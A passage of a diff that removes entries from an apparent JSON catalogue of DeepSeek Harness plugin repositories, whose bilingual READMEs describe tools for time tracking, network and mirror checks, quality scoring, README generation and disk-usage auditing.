\"failed\": 1, \"avgMs\": 245454 } ],\n  \"byProject\": [ ... ],\n  \"byProvider\": [ ... ],\n  \"bySource\": [ ... ],\n  \"warnings\": []\n}\n```\n\n## What it reads\n\nSession logs use the standard dsh event envelope:\n\n- `session_meta` → session id, workspace (`cwd`), model provider, source (desktop / CLI / VS Code / ...)\n- `event_msg` / `task_started` → turn begin\n- `event_msg` / `task_complete` → turn end, `duration_ms`, `time_to_first_token_ms`, `error`\n- `response_item` / `function_call` → tool-call counts\n\nFiles ending in `.jsonl` are parsed; malformed lines are skipped with a warning. Compressed `.jsonl.zstd` logs are not read directly — export or decompress them first (the format is plain JSONL after decompression).\n\n## Why it exists\n\n- The ecosystem tracks tokens and cost, but **no plugin tracked wall-clock time** — the WakaTime-shaped hole in the dsh plugin registry.\n- Answering “where did my 6 hours go?” is the first step to spending agent time deliberately.\n- Zero runtime dependencies, read-only by construction: it never writes to your sessions.\n\n## Development\n\n```sh\npnpm install\npnpm typecheck\npnpm build\npnpm test\npnpm test:integration\n```\n\nCI runs the dsh-plugin-doctor preflight, unit tests, packed-artifact integration (real `timesheet` invocation), and a fresh-profile `dsh web` boot smoke on Windows.\n\n## License\n\nMIT © 2026 zoahdev\n\n---\n\n# dsh-timesheet（中文）\n\n[DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness)（dsh）的**时间报表插件**：从会话日志做基于 turn 的时间跟踪。\n\nToken 仪表盘告诉你花了多少钱；这个插件告诉你**真实花了多少墙钟时间**——总计、按天、按项目、按模型供应商、按来源，外加工具调用次数、失败率和首 token 延迟。零运行时依赖，只读 `*.jsonl` 会话日志。\n\n## 安装\n\n```sh\ndsh plugin add dsh-timesheet\n```\n\n独立使用：\n\n```sh\nnpx dsh-timesheet ~/.codex/sessions\n```\n\n## CLI\n\n```sh\ndsh-timesheet <dir> [--json]\n```\n\n- `dir` 需要包含 `*.jsonl` 会话日志（如 `~/.codex/sessions`、dsh 会话目录或导出的会话目录）。\n- 输出 Markdown 报告；`--json` 输出机器可读的 `dsh-timesheet/v1` 报告。\n- 退出码：`0` 生成成功，`1` 没有 turn / 有警告，`2` 用法/IO 错误。\n\n```sh\nnpx dsh-timesheet ~/.codex/sessions\nnpx dsh-timesheet ~/.codex/sessions --json\n```\n\n## 在 harness 内使用（agent 可调用）\n\n对 agent 说：\n\n> 给我出一份时间报表：`timesheet`，目录指向会话日志目录。\n\n工具返回 `dsh-timesheet/v1` 报告（结构见英文版 JSON 示例）。\n\n## 读取什么\n\n会话日志使用标准 dsh 事件结构：\n\n- `session_meta` → 会话 id、工作区（`cwd`）、模型供应商、来源（desktop / CLI / VS Code / ...）\n- `event_msg` / `task_started` → turn 开始\n- `event_msg` / `task_complete` → turn 结束、`duration_ms`、`time_to_first_token_ms`、`error`\n- `response_item` / `function_call` → 工具调用计数\n\n只解析 `.jsonl`，畸形行跳过并告警。压缩的 `.jsonl.zstd` 不直接读取——先解压（解压后就是纯 JSONL）。\n\n## 为什么需要它\n\n- 生态里到处是 token 和成本统计，但**没有人统计墙钟时间**——这是 dsh 插件注册表里 WakaTime 形状的空洞。\n- 回答“我 6 小时去哪了”是开始有意支配 agent 时间的第一步。\n- 零运行时依赖、天然只读：永远不会写你的会话。\n\n## 开发\n\n```sh\npnpm install\npnpm typecheck\npnpm build\npnpm test\npnpm test:integration\n```\n\nCI 跑 dsh-plugin-doctor 预检、单元测试、打包集成（真实 `timesheet` 调用）、Windows 全新 profile 的 `dsh web` 启动冒烟。\n\n## 许可证\n\nMIT © 2026 zoahdev\n## Related ecosystem tools\n\n- [dsh-dep-audit](https://github.com/zoahdev/dsh-dep-audit) - dependency supply-chain hygiene\n- [dsh-quality-score](https://github.com/zoahdev/dsh-quality-score) - plugin quality scorecard + full-registry leaderboard\n- [dsh-ecosystem](https://github.com/zoahdev/dsh-ecosystem) - health scan, impact, trend, live dashboard\n- [dsh-tutorials](https://github.com/zoahdev/dsh-tutorials) - bilingual plugin pipeline tutorials\n## FAQ\n\n- **How do I install?** dsh plugin add dsh-timesheet or run the CLI directly (see README).\n- **Does it need an API key?** No.\n- **Is it read-only?** Yes by default; any write/apply is an explicit flag.\n## Examples\n\nSee the README for full CLI usage. Quick start:\n\n```sh\nnpx dsh-timesheet --help\n```\n\n"
-    },
-    {
-      "full_name": "zoahdev/dsh-cn-boot",
-      "html_url": "https://github.com/zoahdev/dsh-cn-boot",
-      "description": "China-network bootstrap for DeepSeek Harness (dsh): connectivity probes to npm/GitHub/HuggingFace/mirrors, local proxy detection, mirror recommendations, generated PowerShell/bash bootstrap. Read-only by default; apply is explicit. CLI + agent-callable cn_boot tool.",
-      "stars": 1,
-      "language": "TypeScript",
-      "pushed_at": "2026-08-18T22:30:55Z",
-      "topics": [
-        "bootstrap",
-        "china",
-        "deepseek-harness",
-        "dsh-plugin",
-        "mirror",
-        "network"
-      ],
-      "categories": [
-        "终端/TUI"
-      ],
-      "tags": [
-        "bootstrap",
-        "china",
-        "deepseek-harness",
-        "dsh-plugin",
-        "mirror",
-        "network",
-        "agent"
-      ],
-      "readme_text": "# dsh-cn-boot\n\n[![npm](https://img.shields.io/npm/v/dsh-cn-boot.svg)](https://www.npmjs.com/package/dsh-cn-boot)\n\n[![CI](https://github.com/zoahdev/dsh-cn-boot/actions/workflows/ci.yml/badge.svg)](https://github.com/zoahdev/dsh-cn-boot/actions)\n[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)\n[![dsh-plugin](https://img.shields.io/badge/dsh--plugin-verified-blue)](https://github.com/topics/dsh-plugin)\n\nChina-network bootstrap for [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) (dsh): one command that tells you **why installs are slow or broken** and what to do about it.\n\nIt probes the endpoints that matter to a dsh user in mainland China — npm registry, npmmirror, GitHub, raw.githubusercontent, Hugging Face, Gitee — plus common local proxy ports (127.0.0.1:7897 / 10809), reads your current npm/pnpm registry config, and returns concrete recommendations plus a copy-paste bootstrap script. **Read-only by default**; `apply` is an explicit opt-in that only sets the npm/pnpm registry to npmmirror.\n\n## Install\n\n```sh\ndsh plugin add dsh-cn-boot\n```\n\nOr run standalone:\n\n```sh\nnpx dsh-cn-boot\n```\n\n## CLI\n\n```sh\ndsh-cn-boot [--apply] [--json] [--timeout <ms>]\n```\n\n- Prints probe results, recommendations and a PowerShell + bash bootstrap script.\n- `--apply` runs `pnpm config set registry https://registry.npmmirror.com` (and npm) when recommended — the only side effect.\n- Exit codes: `0` connectivity looks fine, `1` recommendations, `2` usage error.\n\n```sh\nnpx dsh-cn-boot\nnpx dsh-cn-boot --apply\nnpx dsh-cn-boot --json\n```\n\n## In-harness usage (agent-callable)\n\nAsk your dsh agent:\n\n> 检查一下我的网络连 dsh 依赖源通不通，给个引导建议。\n> Run a China-network bootstrap check: `cn_boot`.\n\nThe tool returns a `dsh-cn-boot/v1` result: per-target probe results, current registry config, recommendations, a generated script, and (only with `options.apply: true`) what was applied.\n\n## Checks\n\n| Probe | Why |\n|---|---|\n| `registry.npmjs.org/-/ping` | official npm registry reachability |\n| `registry.npmmirror.com/-/ping` | the standard China mirror |\n| `github.com` | dsh source installs / docs |\n| `raw.githubusercontent.com` | raw file downloads |\n| `huggingface.co` | model/asset downloads |\n| `gitee.com` | domestic fallback |\n| `127.0.0.1:7897` / `127.0.0.1:10809` | common local proxy ports (Clash / V2Ray) |\n\n## Why it exists\n\n- The most common first-hour failure for dsh users in China is a network one: `pnpm dlx @deepseek-ai/dsh` hangs or ERESOLVE, GitHub clones time out, `raw.githubusercontent.com` is unreachable.\n- Existing tools tell you *something is broken*; this one tells you *what* and *what to run next* — mirror registry, proxy env, or nothing at all.\n- Zero runtime dependencies, read-only by default, and the apply path is a single, explicit, reversible registry setting.\n\n## Development\n\n```sh\npnpm install\npnpm typecheck\npnpm build\npnpm test\npnpm test:integration\n```\n\nCI runs the dsh-plugin-doctor preflight, unit tests, packed-artifact integration (real `cn_boot` invocation), and a fresh-profile `dsh web` boot smoke on Windows.\n\n## License\n\nMIT © 2026 zoahdev\n\n---\n\n# dsh-cn-boot（中文）\n\n[DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness)（dsh）的**国内网络引导插件**：一条命令告诉你安装为什么慢/坏，以及该怎么做。\n\n它探测国内 dsh 用户最关心的端点——npm 官方源、npmmirror、GitHub、raw.githubusercontent、Hugging Face、Gitee——以及常见本地代理端口（127.0.0.1:7897 / 10809），读取当前 npm/pnpm 注册表配置，返回具体建议和一份可直接复制的引导脚本（PowerShell + bash）。**默认只读**；`apply` 是显式开关，唯一副作用是把 npm/pnpm 注册表设为 npmmirror。\n\n## 安装\n\n```sh\ndsh plugin add dsh-cn-boot\n```\n\n独立使用：\n\n```sh\nnpx dsh-cn-boot\n```\n\n## CLI\n\n```sh\ndsh-cn-boot [--apply] [--json] [--timeout <ms>]\n```\n\n- 输出探测结果、建议和 PowerShell + bash 引导脚本。\n- `--apply` 在推荐时执行 `pnpm config set registry https://registry.npmmirror.com`（以及 npm）——唯一的副作用。\n- 退出码：`0` 网络正常，`1` 有建议，`2` 用法错误。\n\n```sh\nnpx dsh-cn-boot\nnpx dsh-cn-boot --apply\nnpx dsh-cn-boot --json\n```\n\n## 在 harness 内使用（agent 可调用）\n\n对 agent 说：\n\n> 检查一下我的网络连 dsh 依赖源通不通，给个引导建议。\n\n工具返回 `dsh-cn-boot/v1` 结果：各目标探测结果、当前注册表配置、建议、生成脚本，以及（仅当 `options.apply: true` 时）已执行的操作。\n\n## 为什么需要它\n\n- 国内 dsh 用户第一小时的失败大多是网络问题：`pnpm dlx @deepseek-ai/dsh` 卡住或 ERESOLVE、GitHub clone 超时、raw.githubusercontent 不通。\n- 现有工具只告诉你“坏了”；这个插件告诉你“哪里坏、下一步跑什么”——换镜像、走代理，或者什么都不用动。\n- 零运行时依赖、默认只读，apply 路径是单一、显式、可逆的注册表设置。\n\n## 开发\n\n```sh\npnpm install\npnpm typecheck\npnpm build\npnpm test\npnpm test:integration\n```\n\nCI 跑 dsh-plugin-doctor 预检、单元测试、打包集成（真实 `cn_boot` 调用）、Windows 全新 profile 的 `dsh web` 启动冒烟。\n\n## 许可证\n\nMIT © 2026 zoahdev\n## Related ecosystem tools\n\n- [dsh-dep-audit](https://github.com/zoahdev/dsh-dep-audit) - dependency supply-chain hygiene\n- [dsh-quality-score](https://github.com/zoahdev/dsh-quality-score) - plugin quality scorecard + full-registry leaderboard\n- [dsh-ecosystem](https://github.com/zoahdev/dsh-ecosystem) - health scan, impact, trend, live dashboard\n- [dsh-tutorials](https://github.com/zoahdev/dsh-tutorials) - bilingual plugin pipeline tutorials\n## FAQ\n\n- **How do I install?** dsh plugin add dsh-cn-boot or run the CLI directly (see README).\n- **Does it need an API key?** No.\n- **Is it read-only?** Yes by default; any write/apply is an explicit flag.\n## Examples\n\nSee the README for full CLI usage. Quick start:\n\n```sh\nnpx dsh-cn-boot --help\n```\n\n"
-    },
-    {
-      "full_name": "zoahdev/dsh-quality-score",
-      "html_url": "https://github.com/zoahdev/dsh-quality-score",
-      "description": "Quality scorecard for DeepSeek Harness (dsh) plugins: 0-100, 6 components, fix suggestions, batch leaderboard. CLI + agent-callable quality_score tool.",
-      "stars": 1,
-      "language": "TypeScript",
-      "pushed_at": "2026-08-18T22:31:41Z",
-      "topics": [
-        "deepseek-harness",
-        "dsh-plugin",
-        "quality",
-        "registry",
-        "scorecard"
-      ],
-      "categories": [
-        "终端/TUI"
-      ],
-      "tags": [
-        "deepseek-harness",
-        "dsh-plugin",
-        "quality",
-        "registry",
-        "scorecard",
-        "agent"
-      ],
-      "readme_text": "# dsh-quality-score\n\n[![npm](https://img.shields.io/npm/v/dsh-quality-score.svg)](https://www.npmjs.com/package/dsh-quality-score)\n\n[![CI](https://github.com/zoahdev/dsh-quality-score/actions/workflows/ci.yml/badge.svg)](https://github.com/zoahdev/dsh-quality-score/actions)\n[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)\n[![dsh-plugin](https://img.shields.io/badge/dsh--plugin-verified-blue)](https://github.com/topics/dsh-plugin)\n\nQuality scorecard for [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) (dsh) plugins: **0-100 score + grade + per-component breakdown**, with issues and fix suggestions.\n\nBuilt on the same methodology as the [ecosystem supply-chain health scan](https://github.com/zoahdev/dsh-ecosystem/blob/main/docs/ecosystem-supply-chain-health-2026-08-18.md): manifest completeness, peer resolvability, dist-tag health (the #2763 class), dead ranges, freshness, and dsh-tools peer compatibility. Zero runtime dependencies, read-only.\n\n## Install\n\n```sh\ndsh plugin add dsh-quality-score\n```\n\nOr run standalone:\n\n```sh\nnpx dsh-quality-score dsh-dep-audit\n```\n\n## CLI\n\n```sh\ndsh-quality-score <npm-name> [--json]\ndsh-quality-score --batch <names-file> [--json]\ndsh-quality-score --batch-registry <registry.json> [--category <name>] [--json]\n```\n\nPrints the score, grade, component breakdown, issues and suggestions. `--batch` scores every package name in a file (one per line, `#` comments ignored) and prints a ranked leaderboard — the building block for a registry-wide quality table.\n\n```sh\nnpx dsh-quality-score dsh-dep-audit\nnpx dsh-quality-score dsh-vault --json\nnpx dsh-quality-score --batch registry-names.txt\n```\n\n## In-harness usage (agent-callable)\n\nAsk your dsh agent:\n\n> 给这个插件打个质量分：`quality_score`，包名 dsh-dep-audit。\n> Score this plugin: `quality_score` with `name` set to the npm package.\n\nReturns a `dsh-quality-score/v1` report:\n\n```json\n{\n  \"schema\": \"dsh-quality-score/v1\",\n  \"name\": \"dsh-dep-audit\",\n  \"ok\": false,\n  \"score\": 65,\n  \"grade\": \"C\",\n  \"components\": [\n    { \"id\": \"manifest\", \"name\": \"Manifest completeness\", \"max\": 20, \"earned\": 20, \"note\": \"version 0.1.1\" },\n    { \"id\": \"peer-resolvable\", \"name\": \"Peer resolvability\", \"max\": 20, \"earned\": 20, \"note\": \"1 peer range(s)\" },\n    { \"id\": \"dist-tag\", \"name\": \"Dist-tag health\", \"max\": 15, \"earned\": 15, \"note\": \"latest=0.1.1\" },\n    { \"id\": \"dead-ranges\", \"name\": \"Dead ranges\", \"max\": 15, \"earned\": 15, \"note\": \"none\" },\n    { \"id\": \"freshness\", \"name\": \"Freshness\", \"max\": 10, \"earned\": 10, \"note\": \"2026-08-18\" },\n    { \"id\": \"dsh-tools-peer\", \"name\": \"dsh-tools peer compat\", \"max\": 10, \"earned\": 0, \"note\": \"declared ^0.1.0-rc.6; dsh-tools latest=0.0.1-rc.1\" }\n  ],\n  \"issues\": [\"declared @deepseek-ai/dsh-tools peer range is contradicted by the broken latest dist-tag (#2763 class)\"],\n  \"suggestions\": [\"Install with @deepseek-ai/dsh-tools@0.1.0-rc.7 (or the matching rc) until the official latest is fixed\"],\n  \"error\": null\n}\n```\n\n## Components\n\n| Component | Max | What it measures |\n|---|---|---|\n| `manifest` | 20 | name / version / description / license present in the latest version |\n| `peer-resolvable` | 20 | every peer range has a published match |\n| `dist-tag` | 15 | latest vs next mismatch (#2763 class) |\n| `dead-ranges` | 15 | peer ranges referencing unpublished package names |\n| `freshness` | 10 | latest release within 365 days |\n| `dsh-tools-peer` | 10 | declared dsh-tools peer satisfied by the current latest dist-tag |\n\nGrade: A ≥ 95 · B ≥ 85 · C ≥ 70 · D ≥ 55 · F below.\n\n## Why it exists\n\n- The registry has 900+ plugins; quality signals exist (dsh-ecosystem, dsh-recommend) but nothing gives a per-plugin **actionable score with fix suggestions** from npm metadata alone.\n- Same evidence basis as the supply-chain health scan — one dist-tag fix on the official side would raise scores across the ecosystem.\n- Zero runtime dependencies, read-only; degrades gracefully offline.\n\n## Development\n\n```sh\npnpm install\npnpm typecheck\npnpm build\npnpm test\npnpm test:integration\n```\n\nCI runs the dsh-plugin-doctor preflight, unit tests (mock registry), packed-artifact integration, and a fresh-profile `dsh web` boot smoke on Windows.\n\n## License\n\nMIT © 2026 zoahdev\n\n---\n\n# dsh-quality-score（中文）\n\n[DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness)（dsh）插件的**质量评分卡**：0-100 分 + 等级 + 分项明细，带问题与修复建议。\n\n方法学与 [生态供应链健康扫描](https://github.com/zoahdev/dsh-ecosystem/blob/main/docs/ecosystem-supply-chain-health-2026-08-18.md) 一致：manifest 完整度、peer 可解析性、dist-tag 健康（#2763 类）、死依赖、新鲜度、dsh-tools peer 兼容性。零运行时依赖、只读。\n\n## 安装\n\n```sh\ndsh plugin add dsh-quality-score\n```\n\n独立使用：\n\n```sh\nnpx dsh-quality-score dsh-dep-audit\nnpx dsh-quality-score --batch registry-names.txt   # 批量评分，输出质量榜单\n```\n\n## 在 harness 内使用（agent 可调用）\n\n> 给这个插件打个质量分：`quality_score`，包名 dsh-dep-audit。\n\n返回 `dsh-quality-score/v1` 报告（结构见英文版 JSON 示例）。\n\n## 分项\n\n| 组件 | 满分 | 衡量 |\n|---|---|---|\n| `manifest` | 20 | latest 版本是否含 name/version/description/license |\n| `peer-resolvable` | 20 | 每个 peer 范围是否有已发布版本匹配 |\n| `dist-tag` | 15 | latest 与 next 不一致（#2763 类） |\n| `dead-ranges` | 15 | peer 范围引用不存在的包名 |\n| `freshness` | 10 | latest 发布时间是否在 365 天内 |\n| `dsh-tools-peer` | 10 | 声明的 dsh-tools peer 是否被当前 latest 满足 |\n\n等级：A ≥ 95 · B ≥ 85 · C ≥ 70 · D ≥ 55 · F 以下。\n\n## 为什么需要它\n\n- 注册表 900+ 插件，质量信号存在但没有“npm 元数据就能给分 + 修复建议”的插件。\n- 与供应链健康扫描同一证据基础；官方修一个 dist-tag 就能拉高全生态分数。\n- 零运行时依赖、只读；离线优雅降级。\n\n## 开发\n\n```sh\npnpm install\npnpm typecheck\npnpm build\npnpm test\npnpm test:integration\n```\n\nCI 跑 dsh-plugin-doctor 预检、单元测试（mock 注册表）、打包集成、Windows 全新 profile 的 `dsh web` 启动冒烟。\n\n## 许可证\n\nMIT © 2026 zoahdev\n## Related ecosystem tools\n\n- [dsh-dep-audit](https://github.com/zoahdev/dsh-dep-audit) - dependency supply-chain hygiene\n- [dsh-quality-score](https://github.com/zoahdev/dsh-quality-score) - plugin quality scorecard + full-registry leaderboard\n- [dsh-ecosystem](https://github.com/zoahdev/dsh-ecosystem) - health scan, impact, trend, live dashboard\n- [dsh-tutorials](https://github.com/zoahdev/dsh-tutorials) - bilingual plugin pipeline tutorials\n## FAQ\n\n- **How do I install?** dsh plugin add dsh-quality-score or run the CLI directly (see README).\n- **Does it need an API key?** No.\n- **Is it read-only?** Yes by default; any write/apply is an explicit flag.\n\n"
-    },
-    {
-      "full_name": "zoahdev/dsh-readme-forge",
-      "html_url": "https://github.com/zoahdev/dsh-readme-forge",
-      "description": "Generate README.md for DeepSeek Harness (dsh) plugin repositories from package.json + cordis.patch.yml + source layout — deterministic, zero runtime deps, read-only by default. CLI + agent-callable readme_forge tool.",
-      "stars": 1,
-      "language": "TypeScript",
-      "pushed_at": "2026-08-18T22:31:03Z",
-      "topics": [
-        "deepseek-harness",
-        "documentation",
-        "dsh-plugin",
-        "generator",
-        "readme",
-        "scaffold"
-      ],
-      "categories": [
-        "终端/TUI"
-      ],
-      "tags": [
-        "deepseek-harness",
-        "documentation",
-        "dsh-plugin",
-        "generator",
-        "readme",
-        "scaffold",
-        "agent"
-      ],
-      "readme_text": "# dsh-readme-forge\n\n[![npm](https://img.shields.io/npm/v/dsh-readme-forge.svg)](https://www.npmjs.com/package/dsh-readme-forge)\n\n[![CI](https://github.com/zoahdev/dsh-readme-forge/actions/workflows/ci.yml/badge.svg)](https://github.com/zoahdev/dsh-readme-forge/actions)\n[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)\n[![dsh-plugin](https://img.shields.io/badge/dsh--plugin-verified-blue)](https://github.com/topics/dsh-plugin)\n\nGenerate a **README.md** for [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) (dsh) plugin repositories from `package.json` + `cordis.patch.yml` + source layout.\n\nEvery new plugin needs a README before it can be found by humans or AI. This one builds a deterministic starter: title, description, install command, CLI, tools (from `cordis.patch.yml`), development, and license — then you polish. Read-only by default; writing is explicit. The companion to [dsh-llms-forge](https://github.com/zoahdev/dsh-llms-forge) (which generates `llms.txt` from the README you just forged).\n\n## Install\n\n```sh\ndsh plugin add dsh-readme-forge\n```\n\nOr run standalone:\n\n```sh\nnpx dsh-readme-forge .\n```\n\n## CLI\n\n```sh\ndsh-readme-forge [dir] [options]\n\n  --write        write README.md to disk\n  --overwrite    replace an existing README.md (only with --write)\n  --no-tools     omit the Tools section from cordis.patch.yml\n  --no-dev       omit the Development section\n  --json         print the machine-readable dsh-readme-forge/v1 result\n  --help         show this help\n```\n\nExit codes: `0` clean, `1` warnings, `2` usage/IO error.\n\n```sh\nnpx dsh-readme-forge . --write --overwrite\nnpx dsh-readme-forge ./my-plugin --no-tools --json\n```\n\n## In-harness usage (agent-callable)\n\nAsk your dsh agent:\n\n> 给这个插件仓库生成一份 README：`readme_forge`，目录指向仓库根目录，写入并覆盖。\n> Generate a README for this plugin repo: `readme_forge` with `dir` set, then `write: true, overwrite: true`.\n\nThe tool returns a `dsh-readme-forge/v1` result with the proposed content and warnings, and writes the file only when `options.write` is true.\n\n## What it generates\n\n```markdown\n# dsh-dep-audit\n\nDependency supply-chain hygiene audit for DeepSeek Harness ...\n\n## Install\n\ndsh plugin add dsh-dep-audit\n\n## CLI\n\nnpx dsh-dep-audit --help\n\n## Tools\n\n- `dep_audit`\n\n## Development\n\npnpm install && pnpm typecheck && pnpm build && pnpm test\n\n## License\n\nMIT © 2026 zoahdev\n\n> Generated by dsh-readme-forge. Keep this file in sync with package.json and cordis.patch.yml.\n```\n\n## Why it exists\n\n- The ecosystem grows by thousands of plugins per week; most lack a README, and hand-writing one from scratch is the #1 first-hour friction for new plugin authors.\n- Generated READMEs are deterministic and CI-checkable (`--json`, exit code) — the llms-forge pipeline starts where this one ends.\n- Zero runtime dependencies, read-only by default, safe to run anywhere.\n\n## Development\n\n```sh\npnpm install\npnpm typecheck\npnpm build\npnpm test\npnpm test:integration\n```\n\nCI runs the dsh-plugin-doctor preflight, unit tests, packed-artifact integration (real `readme_forge` invocation), and a fresh-profile `dsh web` boot smoke on Windows.\n\n## License\n\nMIT © 2026 zoahdev\n\n---\n\n# dsh-readme-forge（中文）\n\n为 [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness)（dsh）插件仓库**生成 README.md**：数据源是 `package.json` + `cordis.patch.yml` + 源码目录结构。\n\n每个新插件在被人类或 AI 发现之前都需要 README。本插件生成确定性起始文档：标题、描述、安装命令、CLI、工具（取自 `cordis.patch.yml`）、开发与许可证——之后再人工润色。默认只读，写盘需显式开启。与 [dsh-llms-forge](https://github.com/zoahdev/dsh-llms-forge) 互补（它从刚生成的 README 再生成 llms.txt）。\n\n## 安装\n\n```sh\ndsh plugin add dsh-readme-forge\n```\n\n独立使用：\n\n```sh\nnpx dsh-readme-forge .\n```\n\n## CLI\n\n```sh\ndsh-readme-forge [dir] [options]\n\n  --write        把 README.md 写到磁盘\n  --overwrite    覆盖已有 README.md（需配合 --write）\n  --no-tools     省略 cordis.patch.yml 的 Tools 小节\n  --no-dev       省略 Development 小节\n  --json         输出机器可读 dsh-readme-forge/v1 结果\n  --help         帮助\n```\n\n退出码：`0` 干净，`1` 有警告，`2` 用法/IO 错误。\n\n```sh\nnpx dsh-readme-forge . --write --overwrite\nnpx dsh-readme-forge ./my-plugin --no-tools --json\n```\n\n## 在 harness 内使用（agent 可调用）\n\n对 agent 说：\n\n> 给这个插件仓库生成一份 README：`readme_forge`，目录指向仓库根目录，写入并覆盖。\n\n工具返回 `dsh-readme-forge/v1` 结果（含生成内容与警告），仅在 `options.write` 为 true 时写盘。\n\n## 为什么需要它\n\n- 生态每周新增上千插件，多数没有 README；从零手写是插件作者第一小时的常见摩擦。\n- 生成式 README 可复现、可进 CI（`--json` + 退出码）——llms-forge 管道的起点就在这里。\n- 零运行时依赖、默认只读，任何环境都能安全跑。\n\n## 开发\n\n```sh\npnpm install\npnpm typecheck\npnpm build\npnpm test\npnpm test:integration\n```\n\nCI 跑 dsh-plugin-doctor 预检、单元测试、打包集成（真实 `readme_forge` 调用）、Windows 全新 profile 的 `dsh web` 启动冒烟。\n\n## 许可证\n\nMIT © 2026 zoahdev\n## Related ecosystem tools\n\n- [dsh-dep-audit](https://github.com/zoahdev/dsh-dep-audit) - dependency supply-chain hygiene\n- [dsh-quality-score](https://github.com/zoahdev/dsh-quality-score) - plugin quality scorecard + full-registry leaderboard\n- [dsh-ecosystem](https://github.com/zoahdev/dsh-ecosystem) - health scan, impact, trend, live dashboard\n- [dsh-tutorials](https://github.com/zoahdev/dsh-tutorials) - bilingual plugin pipeline tutorials\n## FAQ\n\n- **How do I install?** dsh plugin add dsh-readme-forge or run the CLI directly (see README).\n- **Does it need an API key?** No.\n- **Is it read-only?** Yes by default; any write/apply is an explicit flag.\n## Examples\n\nSee the README for full CLI usage. Quick start:\n\n```sh\nnpx dsh-readme-forge --help\n```\n\n"
-    },
-    {
-      "full_name": "zoahdev/dsh-disk-audit",
-      "html_url": "https://github.com/zoahdev/dsh-disk-audit",
-      "description": "Disk-usage audit for DeepSeek Harness (dsh) data directories: total size, per-directory breakdown, largest files, oversized-file warnings (session logs can hit hundreds of MB), cleanup suggestions. Zero runtime deps, read-only. CLI + agent-callable disk_audit tool.",
-      "stars": 1,
-      "language": "TypeScript",
-      "pushed_at": "2026-08-18T22:31:24Z",
-      "topics": [
-        "cleanup",
-        "deepseek-harness",
-        "disk-usage",
-        "dsh-plugin",
-        "session-logs",
-        "storage"
-      ],
-      "categories": [
-        "终端/TUI"
-      ],
-      "tags": [
-        "cleanup",
-        "deepseek-harness",
-        "disk-usage",
-        "dsh-plugin",
-        "session-logs",
-        "storage",
-        "agent"
-      ],
-      "readme_text": "# dsh-disk-audit\n\n[![npm](https://img.shields.io/npm/v/dsh-disk-audit.svg)](https://www.npmjs.com/package/dsh-disk-audit)\n\n[![CI](https://github.com/zoahdev/dsh-disk-audit/actions/workflows/ci.yml/badge.svg)](https://github.com/zoahdev/dsh-disk-audit/actions)\n[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)\n[![dsh-plugin](https://img.shields.io/badge/dsh--plugin-verified-blue)](https://github.com/topics/dsh-plugin)\n\nDisk-usage audit for [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) (dsh) data directories: **total size, per-directory breakdown, largest directories, oversized files and cleanup suggestions**.\n\nSession logs can grow to hundreds of megabytes (the ecosystem has even seen the ~512 MB stringify cap). This plugin tells you where the space went before it becomes a problem. Zero runtime dependencies, read-only.\n\n## Install\n\n```sh\ndsh plugin add dsh-disk-audit\n```\n\nOr run standalone:\n\n```sh\nnpx dsh-disk-audit ~/.dsh\n```\n\n## CLI\n\n```sh\ndsh-disk-audit [dir] [options]\n\n  --json                   print the machine-readable dsh-disk-audit/v1 report\n  --large-file <bytes>     warn threshold per file (default 104857600 = 100 MB)\n  --skip-node-modules      do not descend into node_modules trees\n  --help                   show this help\n```\n\nExit codes: `0` clean, `1` warnings (oversized files / total above threshold), `2` usage/IO error.\n\n```sh\nnpx dsh-disk-audit ~/.dsh\nnpx dsh-disk-audit ~/.dsh --json --large-file 52428800\n```\n\n## In-harness usage (agent-callable)\n\nAsk your dsh agent:\n\n> 看看我的 dsh 数据目录占了多少磁盘，最大的文件是哪些。\n> Audit disk usage of my dsh data directory: `disk_audit`.\n\nThe tool returns a `dsh-disk-audit/v1` report:\n\n```json\n{\n  \"schema\": \"dsh-disk-audit/v1\",\n  \"target\": \"~/.dsh\",\n  \"ok\": false,\n  \"totalBytes\": 157286400,\n  \"totalFiles\": 1842,\n  \"dirs\": [ { \"dir\": \"~/.dsh/sessions\", \"sizeBytes\": 146800640, \"files\": 42 } ],\n  \"largestFiles\": [ { \"path\": \"~/.dsh/sessions/big.jsonl\", \"sizeBytes\": 134217728 } ],\n  \"warnings\": [\"1 file(s) at or above 100 MB\"],\n  \"suggestions\": [\"Export/compress the largest session logs before they hit the stringify cap\"]\n}\n```\n\n## Why it exists\n\n- Session logs are append-only and can silently eat gigabytes; no other plugin reports disk usage by directory.\n- Catching a 500 MB session log before it hits the stringify cap is a lot cheaper than recovering after.\n- Zero runtime dependencies, read-only by construction — it never deletes or moves anything.\n\n## Development\n\n```sh\npnpm install\npnpm typecheck\npnpm build\npnpm test\npnpm test:integration\n```\n\nCI runs the dsh-plugin-doctor preflight, unit tests, packed-artifact integration (real `disk_audit` invocation), and a fresh-profile `dsh web` boot smoke on Windows.\n\n## License\n\nMIT © 2026 zoahdev\n\n---\n\n# dsh-disk-audit（中文）\n\n[DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness)（dsh）数据目录的**磁盘占用审计**：总大小、按目录拆分、最大目录、超大文件与清理建议。\n\n会话日志是追加式的，能悄悄涨到几百 MB（社区甚至见过 ~512 MB 的 stringify 上限）。本插件在你遇到问题前先告诉你空间去哪了。零运行时依赖、只读。\n\n## 安装\n\n```sh\ndsh plugin add dsh-disk-audit\n```\n\n独立使用：\n\n```sh\nnpx dsh-disk-audit ~/.dsh\n```\n\n## CLI\n\n```sh\ndsh-disk-audit [dir] [options]\n\n  --json                   输出机器可读 dsh-disk-audit/v1 报告\n  --large-file <bytes>     单文件告警阈值（默认 104857600 = 100 MB）\n  --skip-node-modules      不进入 node_modules 树\n  --help                   帮助\n```\n\n退出码：`0` 干净，`1` 有警告（超大文件 / 总量超阈值），`2` 用法/IO 错误。\n\n```sh\nnpx dsh-disk-audit ~/.dsh\nnpx dsh-disk-audit ~/.dsh --json --large-file 52428800\n```\n\n## 在 